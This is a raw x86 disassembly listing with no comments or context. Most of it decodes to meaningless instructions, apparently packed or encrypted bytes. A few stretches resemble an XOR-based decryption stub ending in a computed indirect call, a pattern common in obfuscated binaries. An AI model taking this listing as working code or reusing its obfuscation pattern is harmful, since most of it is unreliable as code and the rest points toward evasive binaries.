  40cabd:	push   cs
  40cabe:	cwde   
  40cabf:	fdivp  st(2),st
  40cac1:	mov    bh,BYTE PTR [ebx-0x56]
  40cac4:	into   
  40cac5:	loopne 0x40cb3a
  40cac7:	pop    edi
  40cac8:	ret    
  40cac9:	pop    edx
  40caca:	cmc    
  40cacb:	daa    
  40cacc:	xor    BYTE PTR [edi+eiz*2],dl
  40cacf:	dec    edi
  40cad0:	mov    ebx,0xc497aa79
  40cad5:	inc    ecx
  40cad6:	jecxz  0x40caf5
  40cad8:	sbb    ebp,ebx
  40cada:	ror    DWORD PTR [eax+0x6a7aab53],0x84
  40cae1:	dec    ebx
  40cae2:	sbb    DWORD PTR [eax-0x3f],ebx
  40cae5:	mov    dl,0xc
  40cae7:	xchg   ecx,eax
  40cae8:	(bad)  
  40cae9:	mov    esi,0x2ee4c799
  40caee:	and    edx,edi
  40caf0:	push   edx
  40caf1:	dec    ebp
  40caf2:	ins    DWORD PTR es:[edi],dx
  40caf3:	sub    BYTE PTR [edx+0x10],al
  40caf6:	cmp    ebx,ebp
  40caf8:	std    
  40caf9:	mov    cs,WORD PTR [edx+0x11df4a35]
  40caff:	inc    edx
  40cb00:	leave  
  40cb01:	mov    BYTE PTR [esi+0x23],bl
  40cb04:	push   edx
  40cb05:	or     al,0xc8
  40cb07:	push   es
  40cb08:	mov    edx,0xeef63833
  40cb0d:	and    bh,ch
  40cb0f:	jecxz  0x40cb11
  40cb11:	(bad)  
  40cb12:	sub    al,0xf
  40cb14:	das    
  40cb15:	xor    bh,cl
  40cb17:	jge    0x40cb0f
  40cb19:	imul   ebx,DWORD PTR [edi+0x60],0xe7c551b9
  40cb20:	jno    0x40cb10
  40cb22:	jp     0x40caf8
  40cb24:	xchg   esp,eax
  40cb25:	sbb    DWORD PTR [esi+0x18],0x65
  40cb29:	jecxz  0x40cb46
  40cb2b:	inc    ebx
  40cb2c:	mov    ebp,DWORD PTR [ecx-0x27]
  40cb2f:	cld    
  40cb30:	xchg   esi,eax
  40cb31:	jae    0x40cb36
  40cb33:	hlt    
  40cb34:	dec    eax
  40cb35:	mov    gs,ebp
  40cb37:	fisttp WORD PTR [ecx-0x77224f54]
  40cb3d:	jb     0x40cb54
  40cb3f:	jo     0x40cb98
  40cb41:	add    ebp,0xffffffa1
  40cb44:	pop    ecx
  40cb45:	stos   DWORD PTR es:[edi],eax
  40cb46:	and    eax,0xa1ad6031
  40cb4b:	add    eax,0xae609bc4
  40cb50:	or     bh,BYTE PTR [ebx+0x60]
  40cb53:	stc    
  40cb54:	jecxz  0x40cae6
  40cb56:	add    ch,BYTE PTR [esi+0x31ddb195]
  40cb5c:	sub    bl,bl
  40cb5e:	jne    0x40cb86
  40cb60:	adc    ebx,eax
  40cb62:	data16 daa 
  40cb64:	sub    bh,BYTE PTR [edi+0x65]
  40cb67:	mov    ds:0xb2ef7269,eax
  40cb6c:	pop    edx
  40cb6d:	sub    BYTE PTR [ebx],cl
  40cb6f:	ins    DWORD PTR es:[edi],dx
  40cb70:	scas   eax,DWORD PTR es:[edi]
  40cb71:	test   ch,dl
  40cb73:	fcom   QWORD PTR [ecx]
  40cb75:	cmp    BYTE PTR [esi+0x5d8fd9da],dl
  40cb7b:	in     al,dx
  40cb7c:	mov    BYTE PTR [edi+0x2ee5046e],ah
  40cb82:	xor    DWORD PTR [edi+0x7a3b4967],edx
  40cb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb89:	out    dx,eax
  40cb8a:	aaa    
  40cb8b:	cmp    al,BYTE PTR [ebx+0x5403251a]
  40cb91:	cmp    ecx,DWORD PTR [ecx+0x38e40f5]
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x19]
  40cbfc:	cmp    al,0x43
  40cbfe:	cmp    ah,BYTE PTR [edx-0x74]
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	test   DWORD PTR [eax],ebx
  40cc09:	cmp    ch,al
  40cc0b:	push   0xffffff9d
  40cc0d:	mov    ebp,0x1b077e4b
  40cc12:	data16 fistp QWORD PTR [edx]
  40cc15:	ds pop ebp
  40cc17:	cmp    ebx,DWORD PTR ds:[edx-0x39]
  40cc1b:	xor    BYTE PTR [edi-0x20],ah
  40cc1e:	mov    dh,ch
  40cc20:	outs   dx,BYTE PTR ds:[esi]
  40cc21:	pop    ss
  40cc22:	mov    DWORD PTR [esi+0x41],0x810682db
  40cc29:	mov    edx,0x6a486f35
  40cc2e:	aaa    
  40cc2f:	imul   edi,DWORD PTR [esi-0x5d],0x29
  40cc33:	(bad)  
  40cc34:	out    dx,eax
  40cc35:	mov    ah,0xb4
  40cc37:	mov    cl,0x35
  40cc39:	ret    
  40cc3a:	pop    ebp
  40cc3b:	mov    ebp,0xd4c62e02
  40cc40:	and    DWORD PTR [eax+0x50c1d8f9],0xffffffa3
  40cc47:	xchg   ecx,eax
  40cc48:	dec    eax
  40cc49:	jmp    FWORD PTR [edi+eax*1]
  40cc4c:	dec    eax
  40cc4d:	cmp    al,0xf0
  40cc4f:	fcmovnb st,st(5)
  40cc51:	mov    dh,0x23
  40cc53:	fdiv   st(3),st
  40cc55:	pop    ebx
  40cc56:	test   eax,0x9b539463
  40cc5b:	mov    ds:0x5bc59088,al
  40cc60:	repz test al,0x91
  40cc63:	int    0xa5
  40cc65:	adc    BYTE PTR [edi],dh
  40cc67:	mov    eax,0xfa1bd1d2
  40cc6c:	rol    BYTE PTR [ecx-0x5c9be88a],1
  40cc72:	mov    edx,0xb1a715a8
  40cc77:	jno    0x40ccc4
  40cc79:	outs   dx,DWORD PTR ds:[esi]
  40cc7a:	fild   QWORD PTR [ecx-0x26]
  40cc7d:	mov    eax,DWORD PTR [eax-0x6a9e9dce]
  40cc83:	mov    es,WORD PTR [esi+0x6c]
  40cc86:	jb     0x40cd00
  40cc88:	pop    ebp
  40cc89:	ins    BYTE PTR es:[edi],dx
  40cc8a:	je     0x40cce7
  40cc8c:	xchg   ebx,eax
  40cc8d:	jmp    0x40cc65
  40cc8f:	lods   eax,DWORD PTR ds:[esi]
  40cc90:	jmp    0xd20a:0xb86d8744
  40cc97:	loop   0x40ccca
  40cc99:	rol    DWORD PTR [eax],1
  40cc9b:	shl    BYTE PTR [ecx+0x22c2db69],1
  40cca1:	mov    edi,0x11701a0e
  40cca6:	clc    
  40cca7:	and    eax,0xda17ef
  40ccac:	push   DWORD PTR [eax*2+0x1b57d104]
  40ccb3:	push   edi
  40ccb4:	cmp    DWORD PTR [ebx+0x57],edi
  40ccb7:	jl     0x40cc64
  40ccb9:	test   DWORD PTR [edx-0x4d9bbc90],0x44139d69
  40ccc3:	jnp    0x40cce9
  40ccc5:	pop    esp
  40ccc6:	pop    ds
  40ccc7:	ds lock js 0x40cca2
  40cccb:	push   cs
  40cccc:	test   BYTE PTR ds:0x1937848b,dl
  40ccd2:	pusha  
  40ccd3:	retf   0x3c0f
  40ccd6:	mov    edi,0xe419b1da
  40ccdb:	dec    esi
  40ccdc:	mov    dl,0x87
  40ccde:	ins    BYTE PTR es:[edi],dx
  40ccdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cce0:	cmp    BYTE PTR ds:0xc0e94c44,ah
  40cce6:	xor    BYTE PTR [ebx-0x304bca89],dh
  40ccec:	je     0x40cca7
  40ccee:	jmp    0x40cc86
  40ccf0:	imul   di,WORD PTR [ecx+0x64],0xffb4
  40ccf5:	pushf  
  40ccf6:	cmp    al,0xa7
  40ccf8:	cli    
  40ccf9:	xor    edi,DWORD PTR [esi+0x43eaa52e]
  40ccff:	stos   DWORD PTR es:[edi],eax
  40cd00:	push   edi
  40cd01:	dec    edx
  40cd02:	mov    al,BYTE PTR [esi]
  40cd04:	fcomp  st(7)
  40cd06:	cmc    
  40cd07:	fistp  DWORD PTR ds:0xdd881a14
  40cd0d:	inc    edi
  40cd0e:	sbb    BYTE PTR [edx-0x5d],bl
  40cd11:	push   0x1a
  40cd13:	sbb    eax,0x5327d7fe
  40cd18:	aad    0x98
  40cd1a:	cmp    al,bl
  40cd1c:	xor    BYTE PTR [eax+ebx*1-0x76],bh
  40cd20:	dec    edi
  40cd21:	fst    DWORD PTR [esi-0x221d48d4]
  40cd27:	cs jns 0x40cd63
  40cd2a:	add    al,0x81
  40cd2c:	or     bl,al
  40cd2e:	xchg   esi,eax
  40cd2f:	hlt    
  40cd30:	mov    ebp,0x8f5eecb3
  40cd35:	in     eax,0x62
  40cd37:	leave  
  40cd38:	scas   al,BYTE PTR es:[edi]
  40cd39:	cmp    edx,DWORD PTR [ecx]
  40cd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd3c:	mov    bl,0x22
  40cd3e:	ins    BYTE PTR es:[edi],dx
  40cd3f:	xor    BYTE PTR [ebx+0x17],bh
  40cd42:	aaa    
  40cd43:	dec    esi
  40cd44:	mov    cl,0x7a
  40cd46:	add    bh,BYTE PTR [esi+0x41]
  40cd49:	repnz and edx,ebp
  40cd4c:	icebp  
  40cd4d:	in     al,0x7d
  40cd4f:	inc    esi
  40cd50:	mov    dl,BYTE PTR [edx+ebp*4-0x60e4813f]
  40cd57:	ret    
  40cd58:	repz std 
  40cd5a:	and    BYTE PTR [edx-0x75d79a04],dh
  40cd60:	sub    eax,0x87a6591f
  40cd65:	mov    esi,ss
  40cd67:	aam    0x21
  40cd69:	sub    DWORD PTR [edx-0x28c94d0a],ebx
  40cd6f:	pop    eax
  40cd70:	aad    0xb5
  40cd72:	push   ebx
  40cd73:	je     0x40cdcf
  40cd75:	sub    ecx,DWORD PTR [edi-0x7ffd7d11]
  40cd7b:	mov    al,0x51
  40cd7d:	pusha  
  40cd7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd7f:	lds    ebx,FWORD PTR [ebp-0x24]
  40cd82:	xor    al,0x3d
  40cd84:	imul   esp,DWORD PTR [edi+0x7b],0x61eafe87
  40cd8b:	les    esi,FWORD PTR [edi]
  40cd8d:	inc    edi
  40cd8e:	imul   ecx,DWORD PTR [edi+0x17],0xccc0cb7d
  40cd95:	push   ebp
  40cd96:	pop    ecx
  40cd97:	push   es
  40cd98:	mov    DWORD PTR [edi+0x23],esi
  40cd9b:	xchg   ebp,eax
  40cd9c:	jmp    0xd6c1:0xd92d3087
  40cda3:	push   ebx
  40cda4:	mov    ss,WORD PTR [ebp+0x1d]
  40cda7:	sbb    ebp,DWORD PTR [edi]
  40cda9:	retf   0x9383
  40cdac:	mov    eax,ds:0x966367f5
  40cdb1:	mov    eax,0xa67fbcf8
  40cdb6:	or     DWORD PTR [ebx+ebp*8+0x6e],ecx
  40cdba:	sahf   
  40cdbb:	pop    ds
  40cdbc:	scas   eax,DWORD PTR es:[edi]
  40cdbd:	ins    DWORD PTR es:[edi],dx
  40cdbe:	aas    
  40cdbf:	pop    esi
  40cdc0:	je     0x40cda7
  40cdc2:	retf   
  40cdc3:	mov    ds:0xed3028f0,al
  40cdc8:	mov    DWORD PTR [edi+0x7b],edi
  40cdcb:	test   DWORD PTR [edi],0xd2a1904f
  40cdd1:	js     0x40cdc9
  40cdd3:	pop    esi
  40cdd5:	add    BYTE PTR [ebx+edx*4+0x7219b4cf],dl
  40cddc:	dec    ebp
  40cddd:	stos   BYTE PTR es:[edi],al
  40cdde:	inc    esp
  40cddf:	pop    esi
  40cde0:	sbb    eax,0x40677396
  40cde5:	aas    
  40cde6:	loop   0x40cda0
  40cde8:	imul   ebp,edx,0xffffffe3
  40cdeb:	mov    ch,0x67
  40cded:	cmp    esp,DWORD PTR [ebx+esi*1]
  40cdf0:	adc    edi,ecx
  40cdf2:	mov    esi,0xb51f58b5
  40cdf7:	lods   eax,DWORD PTR ds:[esi]
  40cdf8:	es dec ebp
  40cdfa:	jecxz  0x40ce4e
  40cdfc:	sbb    al,0x66
  40cdfe:	mov    bl,0x17
  40ce00:	cmp    bh,BYTE PTR [ebp+0x7bc86656]
  40ce06:	aas    
  40ce07:	imul   ecx,DWORD PTR ds:0x541218c8,0xb9a9eed0
  40ce11:	aas    
  40ce12:	(bad)  
  40ce13:	mov    bh,0x8b
  40ce15:	push   edi
  40ce16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce17:	ja     0x40cd99
  40ce19:	cmp    esp,esp
  40ce1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce1c:	cs mov esi,0x59c641dc
  40ce22:	dec    ebx
  40ce23:	xchg   edi,eax
  40ce24:	and    DWORD PTR ds:0x265dccba,edi
  40ce2a:	hlt    
  40ce2b:	mov    ch,0xb7
  40ce2d:	mov    esi,0x81d174e1
  40ce32:	inc    ebx
  40ce33:	enter  0xbb8c,0xea
  40ce37:	push   0x7a
  40ce39:	test   BYTE PTR [eax+0x26],ch
  40ce3c:	push   edx
  40ce3d:	lea    eax,[edx+edx*1-0x3eeae0bd]
  40ce44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce45:	test   al,0x28
  40ce47:	test   eax,0xf1369909
  40ce4c:	push   edi
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	mov    cl,BYTE PTR [edi+0x47]
  40ce65:	sub    al,0x2c
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	inc    ebx
  40ce6f:	cmp    ebx,DWORD PTR [ebx+eax*4]
  40ce72:	mov    ah,0x17
  40ce74:	in     al,dx
  40ce75:	loop   0x40ce43
  40ce77:	push   ebx
  40ce78:	mov    esi,0xd7b3396e
  40ce7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce7e:	int    0x66
  40ce80:	jmp    0x40ce44
  40ce82:	and    eax,DWORD PTR [edi+0x1d]
  40ce85:	inc    ebx
  40ce86:	add    bh,BYTE PTR [ecx+0x29]
  40ce89:	push   esi
  40ce8a:	pop    es
  40ce8b:	popa   
  40ce8c:	jb     0x40cea9
  40ce8e:	clc    
  40ce8f:	dec    edx
  40ce90:	bound  ebx,QWORD PTR [eax-0x327a26c7]
  40ce96:	sahf   
  40ce97:	add    al,0x13
  40ce99:	add    al,0xb5
  40ce9b:	ds ins BYTE PTR es:[edi],dx
  40ce9d:	add    BYTE PTR [edx+0x16],0x44
  40cea1:	pusha  
  40cea2:	xor    eax,0xca3bf415
  40cea7:	in     al,0x43
  40cea9:	repnz push 0xa92de6fb
  40ceaf:	adc    DWORD PTR [esi+0x37cad3f9],edx
  40ceb5:	hlt    
  40ceb6:	cmp    esp,esp
  40ceb8:	adc    al,0x3a
  40ceba:	mov    es,WORD PTR [ecx+0x6c5cf76b]
  40cec0:	sti    
  40cec1:	adc    ah,dl
  40cec3:	pushf  
  40cec4:	mov    ds:0x21e3628f,eax
  40cec9:	and    DWORD PTR [ecx],ebp
  40cecb:	sub    DWORD PTR [ebp+ecx*1-0x6510a81],edx
  40ced2:	frstor [ebx-0x28994350]
  40ced8:	or     BYTE PTR [eax-0x138de716],ch
  40cede:	cld    
  40cedf:	dec    edx
  40cee0:	dec    ebx
  40cee1:	ins    BYTE PTR es:[edi],dx
  40cee2:	iret   
  40cee3:	add    bl,BYTE PTR ds:0x2a0f386c
  40cee9:	jmp    0x40cecc
  40ceeb:	dec    ecx
  40ceec:	jnp    0x40cee5
  40ceee:	dec    ebx
  40ceef:	adc    ah,dh
  40cef1:	and    eax,0xc52e3c86
  40cef6:	mov    edi,0x2c095ff6
  40cefb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cefc:	and    eax,0x46d8c823
  40cf01:	lea    eax,[edi+0x49b1dd05]
  40cf07:	add    al,0x5f
  40cf09:	mov    esi,0x2cc9addc
  40cf0e:	pop    eax
  40cf0f:	or     BYTE PTR [ebp-0x1513bf32],0x85
  40cf16:	adc    esp,DWORD PTR [ebx]
  40cf18:	mov    DWORD PTR [esi-0x7ecace0c],edi
  40cf1e:	fidiv  WORD PTR [edx+edx*1]
  40cf21:	push   0xf43eb83d
  40cf26:	lds    esp,FWORD PTR ds:0x22dd4b3f
  40cf2c:	xchg   BYTE PTR [ecx],ch
  40cf2e:	xor    al,0xe1
  40cf30:	jp     0x40cf62
  40cf32:	mov    ds:0x55d0b7ee,al
  40cf37:	enter  0x49d7,0x70
  40cf3b:	and    al,0x9a
  40cf3d:	hlt    
  40cf3e:	mov    BYTE PTR [eax+ecx*1],dl
  40cf41:	inc    esi
  40cf42:	add    eax,0xa2c54550
  40cf47:	fisttp WORD PTR [eax+0x13caa830]
  40cf4d:	and    DWORD PTR [eax+0xc76d63e],esp
  40cf53:	mov    esp,0xb26ca50e
  40cf58:	push   ebp
  40cf59:	pop    edx
  40cf5a:	or     al,0x80
  40cf5c:	dec    ecx
  40cf5d:	sbb    al,0x51
  40cf5f:	pop    edx
  40cf60:	dec    ebx
  40cf61:	sbb    BYTE PTR ds:0x89e9df65,bl
  40cf67:	jae    0x40cfc5
  40cf69:	add    al,BYTE PTR [edx]
  40cf6b:	scas   al,BYTE PTR es:[edi]
  40cf6c:	sbb    eax,0x6d9c320b
  40cf71:	xchg   ebp,eax
  40cf72:	xchg   DWORD PTR [eax+0x3d],edx
  40cf75:	loope  0x40cfe7
  40cf77:	nop
  40cf78:	(bad)  
  40cf79:	shl    DWORD PTR [ebx+edi*8-0x63],0xfa
  40cf7e:	outs   dx,BYTE PTR ds:[esi]
  40cf7f:	mov    bl,0x47
  40cf81:	mov    DWORD PTR [esi],esp
  40cf83:	add    eax,0x188f8024
  40cf88:	add    DWORD PTR [edi+0x77673a90],0xacaa48c2
  40cf92:	jle    0x40cf18
  40cf94:	inc    esi
  40cf95:	imul   eax,DWORD PTR [ebp-0x3447dbcd],0xffffffb9
  40cf9c:	arpl   WORD PTR [ecx-0x2],bx
  40cf9f:	sbb    eax,0x469fe84b
  40cfa4:	xchg   edx,eax
  40cfa5:	in     al,0xc7
  40cfa7:	popa   
  40cfa8:	daa    
  40cfa9:	mov    cl,0x7c
  40cfab:	lods   al,BYTE PTR ds:[esi]
  40cfac:	fidivr WORD PTR [esi]
  40cfae:	add    dh,BYTE PTR [ebp-0x525713bf]
  40cfb4:	les    edx,FWORD PTR [edi-0x6944786a]
  40cfba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfbb:	mov    ch,0xac
  40cfbd:	aaa    
  40cfbe:	scas   al,BYTE PTR es:[edi]
  40cfbf:	xchg   ebp,eax
  40cfc0:	in     al,0x5f
  40cfc2:	fdiv   DWORD PTR [edx-0x59b519d4]
  40cfc8:	scas   eax,DWORD PTR es:[edi]
  40cfc9:	pop    ss
  40cfca:	icebp  
  40cfcb:	pop    es
  40cfcc:	add    al,0x4c
  40cfce:	push   cs
  40cfcf:	xor    dh,BYTE PTR [esi]
  40cfd1:	or     BYTE PTR [edi],al
  40cfd3:	dec    esi
  40cfd4:	dec    ebp
  40cfd5:	in     al,0x82
  40cfd7:	imul   ah
  40cfd9:	mov    ds:0xd9840fb5,al
  40cfde:	inc    edx
  40cfdf:	mov    ebx,DWORD PTR [edi]
  40cfe1:	push   eax
  40cfe2:	mov    ds:0xd5c98148,eax
  40cfe7:	test   al,0xf1
  40cfe9:	sar    DWORD PTR [ebp+0x20],0x83
  40cfed:	jmp    0xb8f1:0x859f2baa
  40cff4:	cmp    BYTE PTR [ebp+0x11],dh
  40cff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cff8:	cwde   
  40cff9:	jecxz  0x40d02c
  40cffb:	repz daa 
  40cffd:	(bad)  
  40cffe:	inc    BYTE PTR [ebp-0x305eef96]
  40d004:	mov    cl,0xf2
  40d006:	pop    ds
  40d007:	mov    esp,0xbb374ccf
  40d00c:	sub    DWORD PTR [edx+0x2b],edx
  40d00f:	stos   DWORD PTR es:[edi],eax
  40d010:	and    esp,DWORD PTR [ebx-0x5abb3560]
  40d016:	add    DWORD PTR [edx+0xdf14e78],ecx
  40d01c:	sbb    al,0x4d
  40d01e:	or     DWORD PTR [edx+0x489726b7],ebp
  40d024:	adc    BYTE PTR [edi],0x3e
  40d027:	push   ebx
  40d028:	mov    esp,DWORD PTR [esi+0x3e]
  40d02b:	sub    esi,DWORD PTR [edi+0x78]
  40d02e:	mov    edx,0x196252c0
  40d033:	sahf   
  40d034:	ss loopne 0x40d077
  40d037:	mov    dl,0xfe
  40d039:	push   ds
  40d03a:	sub    BYTE PTR [ebx-0x7c7aad1c],ch
  40d040:	in     al,0xdf
  40d042:	or     BYTE PTR [ebp-0x23],ch
  40d045:	inc    eax
  40d046:	inc    edx
  40d047:	js     0x40cff9
  40d049:	lds    ecx,FWORD PTR [ebx-0x19]
  40d04c:	adc    al,0xf5
  40d04e:	adc    BYTE PTR [edx-0x74527e6d],cl
  40d054:	leave  
  40d055:	sub    ebx,DWORD PTR [edx+0x62]
  40d058:	mov    ah,0x9b
  40d05a:	mov    BYTE PTR [eax-0x33],dh
  40d05d:	xchg   edi,eax
  40d05e:	pop    edi
  40d05f:	sub    cl,dh
  40d061:	out    0x5a,eax
  40d063:	data16 in al,0x9d
  40d066:	push   es
  40d067:	add    edx,DWORD PTR [ebp-0x24]
  40d06a:	call   0xcfd3f9ca
  40d06f:	lods   eax,DWORD PTR ds:[esi]
  40d070:	pop    eax
  40d071:	dec    eax
  40d072:	mov    eax,ds:0xe6b89b36
  40d077:	pop    esp
  40d078:	iret   
  40d079:	div    DWORD PTR [edx+0x17]
  40d07c:	mov    ecx,0x31332ee5
  40d081:	mov    ch,0x79
  40d083:	mov    BYTE PTR [edi+0x16],al
  40d086:	js     0x40d0aa
  40d088:	ins    DWORD PTR es:[edi],dx
  40d089:	cmp    eax,0x59fb078b
  40d08e:	mov    ecx,0xe57cbd93
  40d093:	push   eax
  40d094:	mov    esp,0xabdbf811
  40d099:	fistp  WORD PTR [ebp-0x51]
  40d09c:	fwait
  40d09d:	add    esi,DWORD PTR [edi-0x10cef752]
  40d0a3:	sbb    BYTE PTR ds:0x28fb308a,bl
  40d0a9:	push   edx
  40d0aa:	dec    eax
  40d0ab:	pop    esp
  40d0ac:	retf   0xc437
  40d0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0b0:	call   0x49b43fd1
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	jb     0x40d0e0
  40d0d1:	jnp    0x40d092
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d128
  40d0dc:	mov    al,ds:0xbcd269a2
  40d0e1:	jmp    0xbca5f70b
  40d0e6:	pminsw mm4,QWORD PTR [edx+0x4]
  40d0ea:	mov    al,0x3e
  40d0ec:	in     eax,0x36
  40d0ee:	adc    DWORD PTR [ebp+0x2d],0x22
  40d0f2:	xchg   esi,eax
  40d0f3:	mov    ah,0x81
  40d0f5:	push   cs
  40d0f6:	xor    ecx,ecx
  40d0f8:	sbb    eax,0x2cfa7451
  40d0fd:	and    al,0x3d
  40d0ff:	inc    esp
  40d100:	(bad)  
  40d101:	sub    DWORD PTR gs:[ebp+0x5d51edd4],edx
  40d108:	dec    esp
  40d109:	lock fisttp QWORD PTR [edi]
  40d10c:	repz (bad) 
  40d10e:	mov    al,ds:0x441de10
  40d113:	push   cs
  40d114:	or     ah,BYTE PTR [edi]
  40d116:	push   ds
  40d117:	pop    es
  40d118:	outs   dx,BYTE PTR ds:[esi]
  40d119:	push   ss
  40d11a:	das    
  40d11b:	adc    ch,BYTE PTR [edi]
  40d11d:	out    0xd1,eax
  40d11f:	icebp  
  40d120:	ret    
  40d121:	mov    ss,WORD PTR [esp+edx*4+0x5357ea5d]
  40d128:	mov    BYTE PTR [edx],0x88
  40d12b:	test   eax,0x49e7bf78
  40d130:	mov    bh,0xb4
  40d132:	leave  
  40d133:	jecxz  0x40d1ad
  40d135:	sub    BYTE PTR [ecx],dh
  40d137:	jb     0x40d160
  40d139:	shl    BYTE PTR [ecx],0x47
  40d13c:	in     eax,0x64
  40d13e:	push   0xffffffb5
  40d140:	mov    dl,0x42
  40d142:	mov    eax,ds:0xcb15b3f4
  40d147:	stos   DWORD PTR es:[edi],eax
  40d148:	dec    esp
  40d149:	inc    esp
  40d14a:	fisubr WORD PTR ds:0x15a52f7d
  40d150:	pop    ss
  40d151:	loopne 0x40d167
  40d153:	jb     0x40d129
  40d155:	push   ds
  40d156:	ss cmp al,0xa6
  40d159:	pop    edi
  40d15a:	std    
  40d15b:	add    DWORD PTR [ebx+0x34],edx
  40d15e:	add    bh,BYTE PTR [ebx-0x4d]
  40d161:	sbb    bl,BYTE PTR [edx+0x63f28e0d]
  40d167:	and    eax,0xb51502c0
  40d16c:	jns    0x40d122
  40d16e:	xor    BYTE PTR [edx+eiz*1+0x1ef2f218],0xee
  40d176:	sub    esp,DWORD PTR [ecx-0x23bd175f]
  40d17c:	add    bl,ah
  40d17e:	retf   
  40d17f:	push   es
  40d180:	push   esp
  40d181:	clc    
  40d182:	xchg   edi,esp
  40d184:	data16 icebp 
  40d186:	fwait
  40d187:	jne    0x40d17a
  40d189:	inc    eax
  40d18a:	rcl    BYTE PTR [edi+0x73872577],cl
  40d190:	sti    
  40d191:	das    
  40d192:	scas   eax,DWORD PTR es:[edi]
  40d193:	cmc    
  40d194:	add    al,0xbd
  40d196:	lss    ebx,FWORD PTR [esi-0x59cccb0f]
  40d19d:	pop    esp
  40d19e:	shl    ebp,1
  40d1a0:	dec    ebp
  40d1a1:	or     al,0xff
  40d1a3:	mov    cl,0x92
  40d1a5:	shr    BYTE PTR [edi],cl
  40d1a7:	jl     0x40d189
  40d1a9:	into   
  40d1aa:	out    0xd,eax
  40d1ac:	xchg   esp,eax
  40d1ad:	jecxz  0x40d1b7
  40d1af:	pop    eax
  40d1b0:	xchg   ebp,eax
  40d1b1:	inc    esp
  40d1b2:	xor    DWORD PTR [ebp+ebx*4+0x5e0adc8],eax
  40d1b9:	or     DWORD PTR [eax-0x7c],esp
  40d1bc:	stos   BYTE PTR es:[edi],al
  40d1bd:	dec    esi
  40d1be:	push   0x85079208
  40d1c3:	dec    esi
  40d1c4:	push   eax
  40d1c5:	inc    esi
  40d1c6:	into   
  40d1c7:	xchg   DWORD PTR [ebx+0x33],esi
  40d1ca:	adc    DWORD PTR [edx+eax*4+0x3],ebx
  40d1ce:	sub    bl,0xbc
  40d1d1:	rcr    BYTE PTR [ebp-0x1b29cec7],0x2a
  40d1d8:	aad    0xd7
  40d1da:	rcr    BYTE PTR [ebp+0x7fbb2bbd],1
  40d1e0:	add    ch,BYTE PTR [ecx-0x3a00087b]
  40d1e6:	mov    ch,0x4f
  40d1e8:	lods   eax,DWORD PTR ds:[esi]
  40d1e9:	jge    0x40d16b
  40d1eb:	jg     0x40d258
  40d1ed:	dec    ebx
  40d1ee:	and    al,0x98
  40d1f0:	push   0x5e
  40d1f2:	aaa    
  40d1f3:	adc    al,0x4d
  40d1f5:	sub    eax,0xf56929f3
  40d1fa:	xchg   ebp,eax
  40d1fb:	mov    dl,0xc1
  40d1fd:	lods   al,BYTE PTR ds:[esi]
  40d1fe:	popa   
  40d1ff:	cmp    BYTE PTR [eax+0x6b],0x0
  40d203:	or     DWORD PTR [ebx],0x1e
  40d206:	lea    eax,[esi]
  40d208:	adc    DWORD PTR [eax-0x46ee6d6e],0x820cbbdf
  40d212:	add    eax,0xdaf11f07
  40d217:	(bad)  
  40d218:	pop    ecx
  40d219:	and    ch,BYTE PTR [eax]
  40d21b:	mov    al,ds:0xccc80f5b
  40d220:	out    dx,eax
  40d221:	adc    dl,BYTE PTR [edx+0x28f4e4fc]
  40d227:	mov    al,ds:0xe5081b5e
  40d22c:	daa    
  40d22d:	popa   
